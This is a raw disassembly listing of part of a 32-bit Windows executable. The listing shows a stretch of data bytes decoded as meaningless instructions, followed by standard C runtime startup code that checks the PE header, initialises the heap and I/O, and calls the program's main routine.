  4223f3:	xor    ah,BYTE PTR [esi+0x8dc779e]
  4223f9:	gs nop
  4223fb:	mov    esi,0x16276025
  422400:	std    
  422401:	(bad)  
  422402:	sar    BYTE PTR [esi-0x1f1b3f5a],1
  422408:	daa    
  422409:	cmp    al,0xe3
  42240b:	rol    DWORD PTR [edx+0x7b],1
  42240e:	mov    dh,0x87
  422410:	mov    dl,0x48
  422412:	dec    esi
  422413:	xor    BYTE PTR [edx+0x436f5871],0x2f
  42241a:	sub    esi,eax
  42241c:	mov    cl,0xf
  42241e:	push   esp
  42241f:	shl    BYTE PTR [edi-0x74cffd35],0x55
  422426:	test   eax,0xe45dee1
  42242b:	sahf   
  42242c:	jp     0x422441
  42242e:	push   esi
  42242f:	dec    edx
  422430:	js     0x4223b7
  422432:	mov    BYTE PTR [edi+0x19d0bc73],dl
  422438:	popf   
  422439:	lahf   
  42243a:	clc    
  42243b:	loope  0x4223e2
  42243d:	mov    ch,0x1a
  42243f:	pusha  
  422440:	out    0x39,eax
  422442:	leave  
  422443:	and    al,0x4b
  422445:	xchg   edx,eax
  422446:	pop    ds
  422447:	lds    edi,FWORD PTR [ebp+0x44]
  42244a:	loop   0x4223ee
  42244c:	jmp    0x47f1c109
  422451:	xchg   ebp,eax
  422452:	mov    dl,0xa9
  422454:	and    bl,BYTE PTR [esi+0x4c754649]
  42245a:	sbb    edi,DWORD PTR [edi-0x668e91a4]
  422460:	mov    esp,0x4582d984
  422465:	dec    esp
  422466:	iret   
  422467:	mov    ah,0xe1
  422469:	mov    dl,0xe0
  42246b:	mov    bh,0xf4
  42246d:	inc    ebp
  42246e:	xor    ah,BYTE PTR [ecx]
  422470:	or     ecx,esp
  422472:	mov    WORD PTR [ecx-0x31c227f],?
  422478:	pop    ebp
  422479:	ins    BYTE PTR es:[edi],dx
  42247a:	out    dx,eax
  42247b:	pop    esi
  42247c:	das    
  42247d:	sbb    eax,0xc321f991
  422482:	es iret 
  422484:	lahf   
  422485:	push   edi
  422486:	dec    eax
  422487:	shl    BYTE PTR [edi-0x5f9d166a],0x56
  42248e:	sbb    al,0x39
  422490:	mov    ds:0xa076ac99,eax
  422495:	mov    cl,BYTE PTR [edi+edi*1]
  422498:	scas   eax,DWORD PTR es:[edi]
  422499:	ret    0xa782
  42249c:	jb     0x4224cf
  42249e:	cmp    al,0x10
  4224a0:	sbb    esi,edx
  4224a2:	aam    0xa1
  4224a4:	mov    eax,0xcfac279a
  4224a9:	and    al,0x4f
  4224ab:	dec    esi
  4224ac:	push   ecx
  4224ad:	xchg   DWORD PTR [edx],edx
  4224af:	out    0x5a,al
  4224b1:	adc    eax,0x2e3b1ca6
  4224b6:	add    esp,ebp
  4224b8:	pop    ss
  4224b9:	daa    
  4224ba:	(bad)  
  4224bb:	push   edx
  4224bc:	jns    0x4224da
  4224be:	and    al,0xd7
  4224c0:	into   
  4224c1:	repnz fst st(0)
  4224c4:	repnz pop edx
  4224c6:	push   0xea84d50e
  4224cb:	fcomp  DWORD PTR [ebx-0x69893fe0]
  4224d1:	dec    edi
  4224d2:	sbb    al,0xd4
  4224d4:	push   edx
  4224d5:	dec    esp
  4224d6:	jae    0x422483
  4224d8:	sub    al,0x2e
  4224da:	loop   0x4224a5
  4224dc:	rcr    BYTE PTR [ecx+0x30],1
  4224df:	outs   dx,DWORD PTR ds:[esi]
  4224e0:	sbb    DWORD PTR [esi],esi
  4224e2:	or     bl,bl
  4224e4:	repz pop ebp
  4224e6:	mov    BYTE PTR [edx],bl
  4224e8:	sti    
  4224e9:	lock ret 
  4224eb:	xor    DWORD PTR [edi-0x70],0x8076c47b
  4224f2:	outs   dx,DWORD PTR ds:[esi]
  4224f3:	or     dl,dl
  4224f5:	scas   al,BYTE PTR es:[edi]
  4224f6:	lods   al,BYTE PTR ds:[esi]
  4224f7:	inc    ebx
  4224f8:	inc    edi
  4224f9:	mov    ecx,0x94f8efbd
  4224fe:	push   eax
  4224ff:	inc    ebx
  422500:	jmp    0x6dd4c1db
  422505:	mov    dl,0xbe
  422507:	jnp    0x422489
  422509:	clc    
  42250a:	push   0x1c55835e
  42250f:	sub    esp,DWORD PTR [esi]
  422511:	jg     0x422508
  422513:	adc    bh,bh
  422515:	sbb    DWORD PTR [ebx],ecx
  422517:	icebp  
  422518:	push   ss
  422519:	jae    0x4224f1
  42251b:	out    0x20,eax
  42251d:	es scas al,BYTE PTR es:[edi]
  42251f:	outs   dx,DWORD PTR ds:[esi]
  422520:	inc    edi
  422521:	sub    al,0xf7
  422523:	add    al,0xad
  422525:	aad    0xbe
  422527:	(bad)  
  422529:	dec    esp
  42252a:	fiadd  DWORD PTR [ecx]
  42252c:	xchg   BYTE PTR [eax+0x46],al
  42252f:	adc    eax,0x311d8edf
  422534:	js     0x422506
  422536:	sbb    esi,DWORD PTR [edx+edi*8+0x17]
  42253a:	repz rol BYTE PTR [ebx+0x36e362fe],0x44
  422542:	push   0x1020ca28
  422547:	add    DWORD PTR [ebx+0xe],edi
  42254a:	add    eax,0xa204da88
  42254f:	mov    ecx,ebx
  422551:	and    ch,cl
  422553:	push   ecx
  422554:	fisubr DWORD PTR [edi-0x3c]
  422557:	loop   0x42255a
  422559:	leave  
  42255a:	sbb    edi,ecx
  42255c:	xchg   esi,eax
  42255d:	mov    al,0x9c
  42255f:	stos   DWORD PTR es:[edi],eax
  422560:	lods   eax,DWORD PTR ds:[esi]
  422561:	aaa    
  422562:	scas   al,BYTE PTR es:[edi]
  422563:	push   ebx
  422564:	xchg   edi,eax
  422565:	pop    ecx
  422566:	dec    edx
  422567:	out    dx,al
  422568:	add    bh,BYTE PTR [ecx+0x77]
  42256b:	dec    esp
  42256c:	add    BYTE PTR [ecx-0x26],dl
  42256f:	pop    ecx
  422570:	xor    eax,0x726ebb1b
  422575:	push   edi
  422576:	mov    dl,ah
  422578:	mov    ebx,0xe77cb92d
  42257d:	mov    ebp,0x9997f486
  422582:	(bad)  
  422584:	(bad)  
  422585:	fld    QWORD PTR [edi]
  422587:	push   edx
  422588:	mov    esi,0x8d78779d
  42258d:	ficomp WORD PTR [edi-0x3570abb2]
  422593:	cld    
  422594:	push   esp
  422595:	push   edi
  422596:	pop    ebx
  422597:	or     DWORD PTR [ecx-0x6f847e75],edi
  42259d:	lods   eax,DWORD PTR gs:[esi]
  42259f:	mov    ch,0x92
  4225a1:	cmp    DWORD PTR [edi+0x21],esp
  4225a4:	xchg   esp,eax
  4225a5:	or     BYTE PTR [ecx],dl
  4225a7:	pop    edx
  4225a8:	adc    ebx,eax
  4225aa:	jo     0x422556
  4225ac:	aas    
  4225ad:	and    DWORD PTR [ebx+0x4b],esp
  4225b0:	xchg   ecx,eax
  4225b1:	fimul  DWORD PTR [ecx-0x4872c0c5]
  4225b7:	mov    dh,0xe
  4225b9:	iret   
  4225ba:	or     al,0x26
  4225bc:	sti    
  4225bd:	test   BYTE PTR [edx+0x5c17cf18],dh
  4225c3:	test   eax,edi
  4225c5:	(bad)  
  4225c6:	mov    ebx,0xb009c566
  4225cb:	mov    edx,0x73bab103
  4225d0:	cmc    
  4225d1:	out    0x39,eax
  4225d3:	inc    ebp
  4225d4:	mov    DWORD PTR [ebx+ebp*4-0x64098732],ebx
  4225db:	stos   BYTE PTR es:[edi],al
  4225dc:	sbb    esp,ecx
  4225de:	xchg   edi,eax
  4225df:	dec    ecx
  4225e0:	dec    ebp
  4225e1:	outs   dx,BYTE PTR ds:[esi]
  4225e2:	or     DWORD PTR [bp+si+0x36a7],edx
  4225e7:	inc    esp
  4225e8:	test   al,0x20
  4225ea:	jp     0x42257b
  4225ec:	adc    edi,edx
  4225ee:	adc    BYTE PTR [ebx],ah
  4225f0:	test   DWORD PTR [ebp-0xf12f8c5],esp
  4225f6:	fild   WORD PTR [ebp+0x20]
  4225f9:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4225fb:	leave  
  4225fc:	xor    al,BYTE PTR [ebx+0x48023099]
  422602:	popa   
  422603:	push   edx
  422604:	and    BYTE PTR [esi-0x67728626],ah
  42260a:	je     0x422655
  42260c:	cmp    ah,bl
  42260e:	fld    TBYTE PTR [edx]
  422610:	div    al
  422612:	stos   BYTE PTR es:[edi],al
  422613:	rol    DWORD PTR [di+0x4c01],0xcf
  422619:	sub    ecx,DWORD PTR [edx-0x74ec172b]
  42261f:	mov    ss,WORD PTR [esi]
  422621:	scas   al,BYTE PTR es:[di]
  422623:	repnz hlt 
  422625:	cmp    DWORD PTR [ecx-0x11],esi
  422628:	mov    ds:0x93aaedd6,eax
  42262d:	cmp    al,0xc3
  42262f:	pusha  
  422630:	int3   
  422631:	aaa    
  422632:	mov    al,0x17
  422634:	add    DWORD PTR [edx+0x3bc434a6],esi
  42263a:	jecxz  0x4225e6
  42263c:	stos   DWORD PTR es:[edi],eax
  42263d:	retf   0xe627
  422640:	and    esi,ecx
  422642:	pop    ecx
  422643:	sbb    esi,esp
  422645:	call   0x84b052d5
  42264a:	test   al,0xd2
  42264c:	cmp    dl,BYTE PTR [ecx+edi*4]
  42264f:	jne    0x42261f
  422651:	mov    edx,0xd2705725
  422656:	shl    BYTE PTR [eax],1
  422658:	adc    eax,0x3b0df80c
  42265d:	daa    
  42265e:	and    DWORD PTR [bx+di],esp
  422661:	cmp    ah,cl
  422663:	ds add al,0xa4
  422666:	push   edx
  422667:	mov    ?,WORD PTR ds:0xa5fda848
  42266d:	mov    ecx,DWORD PTR [ebp-0x4c613acb]
  422673:	cwde   
  422674:	mov    ecx,DWORD PTR [edx-0x5a8343b1]
  42267a:	fiadd  WORD PTR [ebp+ebp*8-0x14]
  42267e:	jae    0x4226c8
  422680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422681:	fisubr WORD PTR [edx+ebp*1]
  422684:	sub    al,0x49
  422686:	ds std 
  422688:	adc    BYTE PTR [edi+0x64],0x0
  42268c:	mov    ss,WORD PTR [edi+0x9e03f4c]
  422692:	mov    ds:0x2d09cd9d,al
  422697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422698:	add    eax,0x16fb7081
  42269d:	and    eax,0x7827b960
  4226a2:	setp   BYTE PTR [esi+ebp*2+0x74]
  4226a7:	push   es
  4226a8:	push   ss
  4226a9:	xor    edi,DWORD PTR [ebx-0x64141820]
  4226af:	and    al,0xf4
  4226b1:	dec    ebp
  4226b2:	jb     0x4226b1
  4226b4:	mov    dh,0x8d
  4226b6:	lock aam 0xeb
  4226b9:	out    dx,eax
  4226ba:	mov    ch,0x2e
  4226bc:	out    dx,al
  4226bd:	jae    0x422697
  4226bf:	out    dx,al
  4226c0:	push   ds
  4226c1:	js     0x422683
  4226c3:	xor    BYTE PTR [esi+esi*2],ch
  4226c6:	mov    ebp,DWORD PTR [edx]
  4226c8:	xchg   ebx,eax
  4226c9:	shr    BYTE PTR ds:0xe0c9d6bf,1
  4226cf:	sbb    al,0xdd
  4226d1:	xchg   edx,eax
  4226d2:	xor    al,0x93
  4226d4:	sbb    edi,DWORD PTR [edi]
  4226d6:	mov    cl,BYTE PTR [esi+0x323f95fb]
  4226dc:	mov    esi,0x982efc1
  4226e1:	jno    0x4226c0
  4226e3:	jae    0x422690
  4226e5:	mov    ebp,0x78a6b3f2
  4226ea:	in     al,dx
  4226eb:	cmc    
  4226ec:	addr16 out dx,al
  4226ee:	and    esi,ebx
  4226f0:	dec    ecx
  4226f1:	adc    al,dh
  4226f3:	mov    ds:0xdc5da88c,al
  4226f8:	in     al,dx
  4226f9:	adc    al,0x23
  4226fb:	ins    DWORD PTR es:[edi],dx
  4226fc:	jmp    eax
  4226fe:	mov    edi,0xd6df91b1
  422703:	sti    
  422704:	adc    DWORD PTR [ebx+0x19874664],esi
  42270a:	sub    bh,BYTE PTR [esi-0x60b0582c]
  422710:	loope  0x42269c
  422712:	daa    
  422713:	pop    es
  422714:	push   esp
  422715:	stc    
  422716:	inc    DWORD PTR [edx-0x6d459b02]
  42271c:	jnp    0x422758
  42271e:	jmp    0x4226ba
  422720:	gs push ds
  422722:	lods   eax,DWORD PTR ss:[esi]
  422724:	mov    ch,BYTE PTR ds:0xc3e94015
  42272a:	push   0xffffffa5
  42272c:	xor    DWORD PTR [eax-0x55],ebp
  42272f:	ret    
  422730:	loop   0x422772
  422732:	(bad)  
  422733:	hlt    
  422734:	icebp  
  422735:	fistp  DWORD PTR [eax]
  422737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422738:	adc    BYTE PTR [ebx-0x4027df3e],dl
  42273e:	pop    edx
  42273f:	ror    BYTE PTR [edx-0x31],cl
  422742:	les    ebx,FWORD PTR [edi+0x57942583]
  422748:	pop    esi
  422749:	call   0x1e82:0xa828
  42274f:	push   ds
  422750:	stc    
  422751:	pcmpgtw mm4,mm7
  422754:	shr    DWORD PTR [ebx],1
  422756:	sbb    ch,BYTE PTR [eax-0x1c]
  422759:	xor    ah,dh
  42275b:	leave  
  42275c:	or     bl,al
  42275e:	jb     0x422776
  422760:	cmc    
  422761:	out    dx,eax
  422762:	ret    0x6268
  422765:	jecxz  0x422733
  422767:	gs inc ebp
  422769:	xchg   ebx,eax
  42276a:	sbb    eax,0x921aa7c6
  42276f:	sbb    DWORD PTR [edi-0xe3def79],eax
  422775:	inc    ecx
  422776:	xchg   edi,eax
  422777:	push   esp
  422778:	push   edx
  422779:	mov    al,0x96
  42277b:	dec    ebx
  42277c:	out    0xbb,al
  42277e:	loope  0x4227c9
  422780:	or     bl,BYTE PTR [eax]
  422782:	mov    ds:0x121c5513,eax
  422787:	aas    
  422788:	sub    ebx,eax
  42278a:	je     0x4227c4
  42278c:	or     ch,ah
  42278e:	rcl    BYTE PTR [ebx],1
  422790:	xchg   ecx,eax
  422791:	inc    edx
  422792:	out    dx,eax
  422793:	push   ebp
  422794:	jbe    0x4227db
  422796:	psrld  mm2,QWORD PTR [ebx-0x1]
  42279a:	push   edx
  42279b:	dec    BYTE PTR ds:0x6b723c4e
  4227a1:	dec    bh
  4227a3:	push   esp
  4227a4:	cmp    al,0xbc
  4227a6:	or     dl,BYTE PTR [ebx-0x6888e1fd]
  4227ac:	rcl    BYTE PTR [ebp+0x37],cl
  4227af:	into   
  4227b0:	nop
  4227b1:	outs   dx,DWORD PTR ds:[esi]
  4227b2:	cmp    ebx,ebp
  4227b4:	dec    edi
  4227b5:	call   0x77eb:0x924c679b
  4227bc:	jg     0x4227ad
  4227be:	fdivr  DWORD PTR [eax-0x2e792211]
  4227c4:	push   ds
  4227c5:	fldenv [ebx+ebp*8]
  4227c8:	cmp    dl,BYTE PTR ds:0x7f74d5f4
  4227ce:	xor    BYTE PTR [edx-0x27e08a2f],bl
  4227d4:	push   ecx
  4227d5:	adc    DWORD PTR [edi],ecx
  4227d7:	push   edx
  4227d8:	cwde   
  4227d9:	ds es pop edx
  4227dc:	mov    ds:0xc8eb183a,eax
  4227e1:	inc    esp
  4227e2:	sub    dh,dh
  4227e4:	push   es
  4227e5:	adc    bh,al
  4227e7:	ret    
  4227e8:	push   0xa5cf44fa
  4227ed:	dec    ebp
  4227ee:	jg     0x422820
  4227f0:	aas    
  4227f1:	dec    ebx
  4227f2:	dec    esi
  4227f3:	out    dx,al
  4227f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227f5:	sbb    BYTE PTR [eax+0x13],dh
  4227f8:	es pushf 
  4227fa:	sub    eax,0x473a0374
  4227ff:	jl     0x422862
  422801:	(bad)  
  422802:	in     eax,0xbc
  422804:	out    0xe1,al
  422806:	stc    
  422807:	add    ch,bh
  422809:	push   ebx
  42280a:	pop    ecx
  42280b:	and    dl,bh
  42280d:	test   BYTE PTR [ebx-0x53cf85aa],al
  422813:	adc    bl,dh
  422815:	push   ecx
  422816:	push   0x969d5786
  42281b:	enter  0xeb5c,0x1a
  42281f:	pop    ds
  422820:	into   
  422821:	jmp    0x42287e
  422823:	mov    ebp,0xc4d429d5
  422828:	push   ds
  422829:	ror    DWORD PTR [ecx-0x5d],0x13
  42282d:	mov    ecx,0xb4e7a3da
  422832:	jmp    0x4228a3
  422834:	cmp    ebp,0x2c
  422837:	mov    ebp,0xab9dbfb0
  42283c:	daa    
  42283d:	sbb    BYTE PTR [ecx],ah
  42283f:	lods   al,BYTE PTR ds:[esi]
  422840:	mov    eax,0xfa85681a
  422845:	call   0xca61:0x635f9ce9
  42284c:	pop    esi
  42284d:	test   DWORD PTR [ebx],ecx
  42284f:	sbb    al,0xc5
  422851:	xor    BYTE PTR [ebp+eax*8+0xc],bl
  422855:	jne    0x422842
  422857:	in     eax,dx
  422858:	sbb    dh,BYTE PTR [edi-0x6b0183a9]
  42285e:	ret    0xee8f
  422861:	pop    es
  422862:	pop    edx
  422863:	loop   0x422841
  422865:	xchg   edx,eax
  422866:	pop    edi
  422867:	shr    BYTE PTR [eax+0x4ffd9f48],cl
  42286d:	in     eax,0x9
  42286f:	jo     0x422856
  422871:	pop    ds
  422872:	ficomp WORD PTR [ecx+0x376fcc45]
  422878:	xchg   DWORD PTR [esi+ecx*2],esp
  42287b:	(bad)  
  42287c:	dec    edi
  42287d:	popf   
  42287e:	ss push esi
  422880:	mov    bh,0xb7
  422882:	xor    ch,cl
  422884:	jne    0x42286d
  422886:	stos   DWORD PTR es:[edi],eax
  422887:	mov    esi,0xd53e6d6c
  42288c:	loope  0x4228f3
  42288e:	push   ss
  42288f:	arpl   WORD PTR [edi-0x6b],bx
  422892:	mov    ebx,0xdbdf4dc8
  422897:	in     al,dx
  422898:	jb     0x422907
  42289a:	and    DWORD PTR [edi],0xffffff89
  42289d:	sbb    DWORD PTR [ebx-0x16],eax
  4228a0:	mov    ds:0x1c4648a2,al
  4228a5:	dec    edx
  4228a6:	mov    DWORD PTR [eax+edx*4-0x2a4633e6],esi
  4228ad:	mov    ch,BYTE PTR [edi]
  4228af:	sub    dl,BYTE PTR ss:[ebx]
  4228b2:	cs mov eax,0xd49a9d6e
  4228b8:	scas   eax,DWORD PTR es:[edi]
  4228b9:	cmp    DWORD PTR [ebx+0x3b650682],0x2f8cee9a
  4228c3:	call   0x3d6c:0x7229a8f7
  4228ca:	js     0x422866
  4228cc:	push   ss
  4228cd:	outs   dx,DWORD PTR ds:[esi]
  4228ce:	adc    eax,ebp
  4228d0:	jne    0x4228dd
  4228d2:	xor    DWORD PTR [ebp+0x1536927d],edi
  4228d8:	inc    esp
  4228d9:	shr    dl,cl
  4228db:	(bad)  
  4228dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228dd:	pop    ss
  4228de:	je     0x42288b
  4228e0:	cmp    edx,DWORD PTR [ebx+edx*4-0x2f]
  4228e4:	push   0xffffff84
  4228e6:	xchg   edx,eax
  4228e7:	and    al,0xb
  4228e9:	js     0x4228b0
  4228eb:	jg     0x422904
  4228ed:	mov    ch,0x81
  4228ef:	icebp  
  4228f0:	int3   
  4228f1:	arpl   WORD PTR [ebx+0x3b],bp
  4228f4:	sub    al,0x87
  4228f6:	imul   ebp,DWORD PTR [ecx+0x5af486c],0x4dc157bc
  422900:	sub    eax,0xf89ad4f0
  422905:	push   ecx
  422906:	std    
  422907:	and    eax,0x41049d52
  42290c:	mov    DWORD PTR [edx+0x4],eax
  42290f:	and    al,0x4d
  422911:	and    esi,ecx
  422913:	sub    eax,0x84e517b6
  422918:	iret   
  422919:	or     al,0x53
  42291b:	inc    edi
  42291c:	lods   al,BYTE PTR ds:[esi]
  42291d:	test   BYTE PTR [ebp-0x38],bl
  422920:	ds cmc 
  422922:	jbe    0x4228d6
  422924:	adc    esi,DWORD PTR [ebx+0x4d878772]
  42292a:	out    dx,eax
  42292b:	push   ebx
  42292c:	pop    eax
  42292d:	cs sub eax,0xf0f69c20
  422933:	(bad)  
  422934:	fcom   QWORD PTR [esi+edx*8+0xf7b5ee2]
  42293b:	or     BYTE PTR [ecx+eax*8],dh
  42293e:	into   
  42293f:	aad    0xfd
  422941:	lds    eax,FWORD PTR [esi+ecx*2-0x1e]
  422945:	lds    ebp,FWORD PTR [ebx+ebp*2]
  422948:	popf   
  422949:	push   ebx
  42294a:	xchg   DWORD PTR [edi-0x64],ebp
  42294d:	cmp    DWORD PTR [edi+ebx*2-0x6cbedee8],edx
  422954:	mov    esp,0xfe0c3398
  422959:	inc    edi
  42295a:	xor    eax,eax
  42295c:	add    esp,0x10
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
